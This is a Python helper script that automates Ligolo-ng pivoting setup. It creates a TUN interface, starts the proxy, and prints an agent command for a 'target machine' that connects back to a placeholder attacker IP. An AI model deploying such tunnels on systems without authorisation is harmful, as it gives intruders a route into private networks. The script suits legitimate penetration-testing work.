import os
import subprocess
import argparse
import platform

def create_tun_interface(interface_name):
    try:
        if platform.system() == "Linux":
            subprocess.run(["sudo", "ip", "tuntap", "add", "user", os.getenv("USER"), "mode", "tun", interface_name], check=True)
            subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], check=True)
            print(f"[+] TUN interface '{interface_name}' created and activated.")
        else:
            print("[-] TUN interface creation is only supported on Linux.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to create TUN interface: {e}")

def start_proxy(proxy_path, listen_address):
    try:
        subprocess.Popen([proxy_path, "-selfcert", "-laddr", listen_address])
        print(f"[+] Ligolo-ng proxy started and listening on {listen_address}.")
    except Exception as e:
        print(f"[-] Failed to start Ligolo-ng proxy: {e}")

def main():
    parser = argparse.ArgumentParser(description="Automate Ligolo-ng setup.")
    parser.add_argument("--proxy-path", required=True, help="Path to the Ligolo-ng proxy binary.")
    parser.add_argument("--listen-address", default="0.0.0.0:11601", help="Address and port for the proxy to listen on (default: 0.0.0.0:11601).")
    parser.add_argument("--interface-name", default="ligolo", help="Name of the TUN interface to create (default: ligolo).")
    args = parser.parse_args()

    create_tun_interface(args.interface_name)
    start_proxy(args.proxy_path, args.listen_address)

    print("\n[+] Ligolo-ng setup complete.")
    print("[*] To deploy the agent on the target machine, use the following command:")
    print(f"    ./agent -connect <attacker_ip>:11601 -ignore-cert")

if __name__ == "__main__":
    main()
